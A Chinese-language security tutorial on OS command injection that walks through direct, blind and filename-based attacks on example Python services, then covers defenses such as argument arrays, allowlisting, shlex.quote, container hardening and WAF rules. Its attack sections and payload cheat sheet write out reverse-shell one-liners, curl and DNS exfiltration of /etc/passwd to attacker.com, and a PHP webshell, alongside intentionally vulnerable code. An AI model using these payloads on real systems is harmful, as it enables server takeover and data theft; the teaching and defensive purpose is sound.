命令注入（OS Command Injection）：原理、攻击与防御

安全 Web安全 命令注入
发布日期:   2026-08-08

一、核心原理

命令注入（OS Command Injection）的本质是用户可控数据被操作系统 Shell 当作命令执行。

这与 SQL 注入、XSS 的逻辑完全同构——SQL 注入是用户输入被数据库引擎当作 SQL 指令执行，XSS 是用户输入被浏览器当作 JavaScript 执行，命令注入是用户输入被操作系统 Shell 当作系统命令执行。三者共享同一个根源：数据与指令的边界混淆。

但命令注入的危害远大于前两者。SQL 注入影响的是数据库，XSS 影响的是浏览器，而命令注入直接影响操作系统——攻击者以 Web 应用进程的权限执行任意系统命令。如果 Web 应用以 root 权限运行，攻击者就获得了 root 权限。

命令注入发生的前提是：应用代码将用户输入拼接到系统命令字符串中，然后通过 system()、exec()、popen()、subprocess 等函数执行。Shell 解析命令字符串时，遇到 ;、|、&&、||、$()、反引号等元字符，会改变命令的执行逻辑。

二、三种命令注入完整攻击实例

2.1 直接命令注入：有回显的完整利用

场景： 一个网络工具网站，提供 ping 功能。用户输入域名，服务端执行 ping 命令并返回结果。

https://tools.com/ping?host=example.com

第一步：确认注入点。 攻击者输入 example.com，服务端返回 ping 结果。抓包分析，确认服务端确实执行了系统命令。

服务端代码大致如下：

# 危险写法：用户输入直接拼入命令
import os
host = request.args.get('host')
output = os.popen(f'ping -c 4 {host}').read()
return output

第二步：测试注入。 攻击者输入 example.com; id，服务端执行 ping -c 4 example.com; id。Shell 将 ; 视为命令分隔符，先执行 ping，再执行 id。返回结果中出现了 uid=33(www-data) gid=33(www-data)，确认命令注入存在。

第三步：读取敏感文件。

example.com; cat /etc/passwd

Shell 执行 ping -c 4 example.com; cat /etc/passwd，返回系统用户列表。

example.com; cat /var/www/html/config.py

读取应用配置文件，可能包含数据库密码、API 密钥。

第四步：获取反向 Shell。 攻击者在自己的服务器上启动监听：

# 攻击者机器上
nc -lvnp 4444

然后通过命令注入发起反向连接：

example.com; bash -i >& /dev/tcp/attacker.com/4444 0>&1

Shell 执行后，目标服务器的 bash 进程连接到攻击者的 nc 监听端口。攻击者获得了一个交互式 Shell，可以像 SSH 登录一样操作目标服务器。

完整数据流：

攻击者提交 host=example.com; bash -i >& /dev/tcp/attacker.com/4444 0>&1
  → 服务端拼入命令：ping -c 4 example.com; bash -i >& /dev/tcp/attacker.com/4444 0>&1
  → Shell 解析 ; 分隔符，执行第二条命令
  → bash 建立到 attacker.com:4444 的 TCP 连接
  → 攻击者的 nc 接收到连接
  → 攻击者获得目标服务器的交互式 Shell
  → 可以执行任意系统命令，完全控制服务器

为什么这能成功？ 因为 Shell 解析命令字符串时，; 是命令分隔符，| 是管道符，&& 是逻辑与，$() 是命令替换。这些元字符改变了命令的结构，让攻击者注入的内容变成了独立的命令被执行。

2.2 盲命令注入：无回显的利用

场景： 一个日志分析工具，用户输入日志文件路径，服务端用 grep 搜索关键词并将结果写入临时文件。前端只显示”处理完成”，不显示命令输出。

# 无回显：结果写入文件，不返回给用户
import os
log_file = request.args.get('file')
os.system(f'grep "ERROR" /var/log/{log_file} > /tmp/result.txt')
return '处理完成'

第一步：确认盲注入存在。 攻击者输入 app.log; sleep 10。如果页面在 10 秒后才返回”处理完成”，说明 sleep 命令被执行了，命令注入存在。

app.log; sleep 10    → 页面 10 秒后返回 → 确认注入
app.log; sleep 0     → 页面立即返回   → 对照验证

第二步：通过 DNS 外带数据。 攻击者无法直接看到命令输出，但可以让服务端发起 DNS 查询，通过 DNS 记录传递数据：

app.log; curl http://$(whoami).attacker.com

Shell 执行 whoami，将结果作为子域名发送到 attacker.com。攻击者在 DNS 日志中看到 www-data.attacker.com 的查询记录，得知命令以 www-data 用户执行。

第三步：通过 HTTP 外带数据。 比 DNS 更灵活，可以传递大量数据：

app.log; curl http://attacker.com/log?data=$(cat /etc/passwd | base64)

Shell 读取 /etc/passwd，Base64 编码后作为 URL 参数发送到攻击者服务器。攻击者在 HTTP 日志中解码获取数据。

第四步：写入 WebShell。 即使没有回显，攻击者仍然可以写入文件：

app.log; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

攻击者访问 https://target.com/shell.php?cmd=id，验证 WebShell 是否写入成功。

完整数据流（HTTP 外带）：

攻击者提交 file=app.log; curl http://attacker.com/log?data=$(cat /etc/passwd | base64)
  → 服务端执行：grep "ERROR" /var/log/app.log; curl http://attacker.com/log?data=$(cat /etc/passwd | base64)
  → grep 执行完成（攻击者不关心结果）
  → curl 读取 /etc/passwd，Base64 编码
  → curl 向 attacker.com 发起 HTTP GET 请求，携带编码后的数据
  → 攻击者在 HTTP 日志中获取 Base64 数据，解码得到 /etc/passwd 内容

盲注入的关键思路： 虽然没有直接回显，但攻击者可以通过时间延迟确认漏洞存在，通过 DNS/HTTP 外带窃取数据，通过写入文件获取持久化访问。无回显不等于无危害。

2.3 间接命令注入：通过文件名和环境变量

场景： 一个文件处理服务，用户上传文件，服务端用 file 命令检测文件类型，然后用 convert（ImageMagick）生成缩略图。

import subprocess
filename = secure_filename(uploaded_file.filename)  # 只过滤了路径分隔符
filepath = f'/tmp/uploads/{filename}'
uploaded_file.save(filepath)

# 危险：文件名被传入 shell 命令
subprocess.call(f'file {filepath}', shell=True)
subprocess.call(f'convert {filepath} -thumbnail 200x200 /tmp/thumb_{filename}', shell=True)

第一步：构造恶意文件名。 攻击者上传文件，文件名为 test.jpg; id。secure_filename() 只过滤了 ../ 等路径分隔符，没有过滤 ;。

第二步：命令注入触发。 服务端执行：

file /tmp/uploads/test.jpg; id
convert /tmp/uploads/test.jpg; id -thumbnail 200x200 /tmp/thumb_test.jpg; id

; 后面的 id 被当作独立命令执行。

另一种间接注入：通过环境变量。 某些应用使用 eval 或模板引擎处理配置，配置值来自环境变量，而环境变量可以被用户间接控制：

# 危险：eval 执行包含用户数据的字符串
import os
template = os.environ.get('GREETING', 'Hello')
os.system(f'echo "{template} {username}"')
# 如果 template 被注入为 $(whoami)，命令变成：
# echo "$(whoami) admin"

通过 Git 配置注入： 如果应用执行 git 命令且参数来自用户输入：

# 用户输入 repo_url = "https://github.com/user/repo; malicious_command"
subprocess.call(f'git clone {repo_url} /tmp/repo', shell=True)

完整数据流（文件名注入）：

攻击者上传文件，文件名: test.jpg; curl http://attacker.com/$(whoami)
  → 文件保存到 /tmp/uploads/test.jpg; curl http://attacker.com/$(whoami)
  → 服务端执行：file /tmp/uploads/test.jpg; curl http://attacker.com/$(whoami)
  → Shell 解析 ; 分隔符
  → file 命令正常执行（处理 test.jpg 部分）
  → curl 执行 whoami，将结果发送到 attacker.com
  → 攻击者通过 DNS/HTTP 日志得知执行用户

间接注入的隐蔽性： 开发者可能认为”文件名是用户上传的，不是直接输入的”，忽略了文件名也是用户可控数据。任何传入 Shell 命令的用户数据——无论是表单参数、文件名、HTTP 头、环境变量——都是潜在的注入点。

三、Shell 元字符与注入语法

理解命令注入需要理解 Shell 如何解析命令字符串。以下是所有可以改变命令结构的元字符：

3.1 命令分隔和链接

# 分号：顺序执行，无论前一条是否成功
cmd1; cmd2            # cmd1 执行完后执行 cmd2

# 逻辑与：前一条成功才执行后一条
cmd1 && cmd2          # cmd1 成功（返回 0）才执行 cmd2

# 逻辑或：前一条失败才执行后一条
cmd1 || cmd2          # cmd1 失败（返回非 0）才执行 cmd2

# 管道：前一条的输出作为后一条的输入
cmd1 | cmd2           # cmd1 的标准输出传给 cmd2 的标准输入

# 后台执行
cmd &                 # cmd 在后台执行

攻击者最常用的分隔符是 ;（无条件执行）和 |（将用户输入通过管道传给另一个命令）。&& 和 || 需要条件判断，使用场景较少。

3.2 命令替换

# $() 形式：执行括号中的命令，将输出替换到原位置
echo $(whoami)        # 输出: www-data

# 反引号形式（旧语法）
echo `whoami`          # 输出: www-data

命令替换允许在命令参数中嵌套执行其他命令。攻击者可以用它读取数据并嵌入到 URL 中实现外带。

3.3 重定向

# 输出重定向：将命令输出写入文件
cmd > file            # 覆盖写入
cmd >> file           # 追加写入

# 输入重定向：从文件读取作为命令输入
cmd < file

# 标准错误重定向
cmd 2> error.log

# /dev/tcp：Bash 特殊的 TCP 连接（用于反向 Shell）
bash -i >& /dev/tcp/attacker.com/4444 0>&1

重定向是写入 WebShell 和建立反向 Shell 的关键。

3.4 注入 payload 速查

# 基础分隔
; id
| id
&& id
|| id

# 命令替换（嵌入参数中）
$(id)
`id`

# 换行符（某些场景下 \n 也能分隔命令）
%0a id

# 反向 Shell
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# 数据外带
; curl http://attacker.com/log?data=$(cat /etc/passwd | base64)
; dig $(whoami).attacker.com

# 写入文件
; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# 读取文件并通过 HTTP 外带
; curl -F "file=@/etc/passwd" http://attacker.com/upload

四、防御策略详解

4.1 避免调用系统命令：最根本的防御

如果不需要执行系统命令，就不要调用。 大多数需要用系统命令实现的功能，都有对应的编程语言原生 API：

# 危险：调用系统命令列出目录内容
output = os.popen(f'ls {directory}').read()

# 安全：使用 Python 原生 API
import os
files = os.listdir(directory)

# 危险：调用系统命令创建目录
os.system(f'mkdir {dirname}')

# 安全：使用 Python 原生 API
os.makedirs(dirname, exist_ok=True)

# 危险：调用系统命令发 HTTP 请求
os.system(f'curl {url}')

# 安全：使用 requests 库
import requests
response = requests.get(url)

// 危险：Runtime.exec 执行系统命令
Runtime.getRuntime().exec("ping " + userInput);

// 安全：使用 Java 原生网络 API
InetAddress address = InetAddress.getByName(hostname);
boolean reachable = address.isReachable(5000);

为什么这是最根本的防御？ 因为不调用系统命令就不存在命令注入的攻击面。没有 Shell 参与，就没有元字符解析，就没有注入的可能。

常见可以用原生 API 替代的场景：

文件操作（ls、cp、mv、mkdir、rm）→ os.listdir、shutil.copy、os.rename、os.makedirs。

网络请求（curl、wget）→ requests、urllib、HttpClient。

进程管理（kill、ps）→ os.kill、psutil。

压缩解压（tar、zip）→ tarfile、zipfile。

图像处理（convert）→ Pillow。

4.2 参数化调用：无法避免时的安全做法

如果确实需要调用外部程序（如调用 ffmpeg 处理视频、调用 gpg 加密文件），不要通过 Shell 执行，使用参数数组的方式调用：

import subprocess

# 危险：通过 Shell 执行，用户输入被 Shell 解析
subprocess.call(f'ffmpeg -i {input_file} -vf scale=200:-1 {output_file}', shell=True)

# 安全：参数数组，不经过 Shell，用户输入不会被解析为命令
subprocess.run([
    'ffmpeg',
    '-i', input_file,
    '-vf', 'scale=200:-1',
    output_file
], check=True, capture_output=True)

为什么参数数组安全？ 因为 subprocess.run(list) 不调用 Shell，而是直接通过 execve() 系统调用执行目标程序。用户输入作为参数传递给 ffmpeg，不会被 Shell 解析。即使 input_file 的值是 test; rm -rf /，ffmpeg 只会把它当作一个文件名（不存在的文件名，会报错），不会执行 rm 命令。

// Java: ProcessBuilder 使用参数数组，不经过 Shell
ProcessBuilder pb = new ProcessBuilder(
    "ffmpeg",
    "-i", inputFile,
    "-vf", "scale=200:-1",
    outputFile
);
Process process = pb.start();

// PHP: escapeshellarg 对参数做 Shell 转义
$input = escapeshellarg($userInput);
$output = escapeshellarg($outputFile);
exec("ffmpeg -i $input -vf scale=200:-1 $output");

关键区别： shell=True 意味着命令字符串会被 Shell 解析（/bin/sh -c "..."），所有元字符生效。shell=False（Python 默认值）意味着直接执行目标程序，没有 Shell 参与，元字符无效。

4.3 输入白名单验证

如果必须将用户输入拼入命令字符串，先做严格的白名单验证：

import re

def validate_hostname(hostname):
    # 只允许字母、数字、点号、连字符
    if not re.match(r'^[a-zA-Z0-9.\-]+$', hostname):
        raise ValueError("Invalid hostname")
    # 额外校验：必须是合法的域名格式
    if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$', hostname):
        raise ValueError("Invalid hostname format")
    return hostname

# 使用
hostname = validate_hostname(request.args.get('host'))
# 通过验证后，hostname 中不包含任何 Shell 元字符
output = subprocess.run(['ping', '-c', '4', hostname], capture_output=True, text=True)

白名单的思路： 只允许已知安全的字符，拒绝一切其他字符。对于域名，只允许字母数字和 .、-；对于 IP 地址，只允许数字和 .；对于文件名，只允许字母数字和 .、-、_。

黑名单为什么不可靠？ 因为 Shell 元字符太多（;、|、&、$、`、(、)、{、}、<、>、?、*、[、]、~、!、#、换行符、空格……），黑名单几乎不可能穷举。而且不同 Shell（bash、sh、zsh、csh）的元字符集合不同，不同操作系统的行为也不同。

4.4 Shell 转义

如果实在无法避免通过 Shell 执行命令，且用户输入必须拼入命令字符串，使用 Shell 转义函数对用户输入进行转义：

import shlex

# shlex.quote 将字符串用单引号包裹，并转义内部的单引号
user_input = "test; rm -rf /"
safe_input = shlex.quote(user_input)
# safe_input = "'test; rm -rf /'"
# 单引号内的所有字符都是字面量，Shell 不会解析

os.system(f'echo {safe_input}')
# 实际执行：echo 'test; rm -rf /'
# 输出：test; rm -rf /（纯文本，不会执行 rm）

// Java: 没有内置的 Shell 转义函数
// 推荐做法：不使用 Shell，用 ProcessBuilder 参数数组
// 如果必须用 Shell，手动用单引号包裹并转义内部单引号
String safeInput = "'" + userInput.replace("'", "'\\''") + "'";

转义的局限性： Shell 转义容易出错——不同 Shell 的转义规则不同，嵌套引号的处理很复杂，编码问题（Unicode、空字节）可能导致转义失效。所以转义是最后的手段，优先使用参数化调用（4.2）。

4.5 最小权限原则

即使命令注入发生，限制 Web 应用的运行权限可以减小影响范围：

不以 root 运行 Web 应用。 创建专用用户，只赋予必要的文件读写权限：

# 创建专用用户
useradd -r -s /bin/false wwwapp
# 设置文件权限
chown -R wwwapp:wwwapp /var/www/app
chmod 750 /var/www/app
# Web 应用以 wwwapp 用户运行
sudo -u wwwapp python3 app.py

使用容器隔离。 将 Web 应用运行在 Docker 容器中，容器内的命令执行被限制在容器的文件系统和网络范围内：

FROM python:3.11-slim
# 不使用 root 运行
RUN useradd -r appuser
USER appuser
COPY . /app
WORKDIR /app
CMD ["python3", "app.py"]

# docker-compose.yml
services:
  web:
    build: .
    read_only: true           # 文件系统只读
    security_opt:
      - no-new-privileges:true # 禁止提权
    cap_drop:
      - ALL                   # 删除所有 Linux capabilities
    networks:
      - frontend              # 只暴露前端网络，不直接访问内网

限制可用的系统命令。 如果应用只需要执行 ping，通过 seccomp 或 AppArmor 限制只能执行 ping，禁止 bash、curl、wget 等危险命令。

4.6 WAF 和运行时检测

Web 应用防火墙（WAF）可以检测常见的命令注入 payload：

# WAF 规则示例（伪代码）
if request.param matches /;\s*(id|whoami|cat|ls|rm|wget|curl|bash|nc|python|perl)/
    block request

if request.param matches /\$\(|`|&&|\|\||\|/
    flag as suspicious

WAF 的局限性： WAF 基于模式匹配，可以被编码绕过（URL 编码、Unicode 编码、Base64）、换行符绕过（%0a）、通配符绕过（/bin/ca? 匹配 /bin/cat）。WAF 是辅助手段，不能替代代码层面的防御。

五、各语言/框架的命令执行风险点

5.1 Python

# 危险等级从高到低：
os.system(user_input)              # 通过 Shell 执行，最危险
os.popen(user_input)               # 通过 Shell 执行
subprocess.call(cmd, shell=True)   # 通过 Shell 执行
subprocess.run(cmd, shell=True)    # 通过 Shell 执行

# 安全：
subprocess.run(['cmd', arg1, arg2])  # 不通过 Shell，参数数组

eval() 和 exec() 虽然不是系统命令执行，但如果用户输入被传入，可以执行任意 Python 代码，危害等同于命令注入。

5.2 Java

// 危险：通过 Shell 执行
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "ping " + userInput});

// 安全：直接执行，不通过 Shell
Runtime.getRuntime().exec(new String[]{"ping", "-c", "4", hostname});

// 安全：ProcessBuilder
new ProcessBuilder("ping", "-c", "4", hostname).start();

Java 的 Runtime.exec(String) 在内部会将字符串按空格分割为参数数组，但分割逻辑与 Shell 不同，可能在特殊字符上产生意外行为。推荐使用 exec(String[]) 或 ProcessBuilder。

5.3 PHP

// 危险：
system($userInput);
exec($userInput);
passthru($userInput);
shell_exec($userInput);
`$userInput`;  // 反引号等同于 shell_exec

// 转义（如果必须拼入命令）：
$safe = escapeshellarg($userInput);   // 转义参数
$safe = escapeshellcmd($userInput);   // 转义整个命令（不推荐，有已知绕过）

escapeshellcmd() 有已知问题：它不处理参数中的特殊字符（如空格），可能导致参数被拆分。推荐用 escapeshellarg() 转义每个参数，或改用 PHP 原生函数。

5.4 Node.js

// 危险：通过 Shell 执行
const { exec } = require('child_process');
exec(`ping -c 4 ${userInput}`);

// 危险：spawn 但通过 Shell
const { spawn } = require('child_process');
spawn('ping', ['-c', '4', userInput], { shell: true });

// 安全：spawn 不通过 Shell
const { spawn } = require('child_process');
spawn('ping', ['-c', '4', userInput]);  // shell: false（默认值）

六、命令注入与其他注入的对比

命令注入、SQL 注入、XSS 三者共享同一个根源——数据与指令边界混淆，但执行环境和影响范围不同：

              SQL 注入              XSS                    命令注入
执行环境      数据库引擎            浏览器 JS 引擎          操作系统 Shell
用户输入被当作  SQL 语句            JavaScript 代码         系统命令
影响范围      数据库数据            用户浏览器会话           整个操作系统
危害程度      数据泄露/篡改         会话劫持/钓鱼           远程代码执行
防御核心      参数化查询            输出编码                 避免调用系统命令

命令注入之所以危害最大，是因为操作系统 Shell 的权限最高——它可以读写文件系统、发起网络请求、创建进程、修改系统配置。一旦攻击者通过命令注入获得 Shell 访问，整个服务器都在其控制之下。

命令注入与文件上传的关联： 文件上传中，文件名被传入系统命令时会触发命令注入（你在文件上传那篇中看到的文件名注入场景）。防御方式相同——对文件名做白名单验证，不信任用户输入。

命令注入与 SSRF 的关联： 某些命令注入可以通过 curl 或 wget 实现 SSRF 的效果（让服务端请求内网地址）。反过来，SSRF 如果支持 gopher:// 协议，也可以向内网的 Redis/Memcached 发送命令实现类似命令注入的效果。

七、防御优先级总结

按重要程度排列：

  1. 避免调用系统命令——用编程语言原生 API 替代，从根本上消除攻击面
  2. 参数化调用——无法避免时使用参数数组（subprocess.run(list)），不经过 Shell
  3. 输入白名单验证——只允许已知安全的字符（字母数字），拒绝一切特殊字符
  4. Shell 转义——shlex.quote() 用单引号包裹用户输入，作为最后手段
  5. 最小权限运行——不以 root 运行 Web 应用，使用容器隔离
  6. WAF 辅助检测——检测常见 payload，但不能替代代码层面防御

八、小结

命令注入的本质是用户输入被操作系统 Shell 当作命令执行，与 SQL 注入、XSS 共享同一个根源——数据与指令的边界混淆。但命令注入的危害最大，因为它直接影响操作系统，攻击者可以执行任意系统命令、读写文件、发起网络请求、获取服务器完全控制权。

按利用方式分三种：直接注入有回显，可以立即读取数据和获取 Shell；盲注入无回显，通过时间延迟确认漏洞、通过 DNS/HTTP 外带窃取数据、通过写入文件持久化；间接注入通过文件名、环境变量等非显式输入通道触发。

防御的核心思路是消除 Shell 参与。最安全的做法是不调用系统命令，用编程语言原生 API 替代。无法避免时使用参数数组调用（不经过 Shell），配合输入白名单验证。最小权限运行和容器隔离作为兜底，减小被利用后的影响范围。
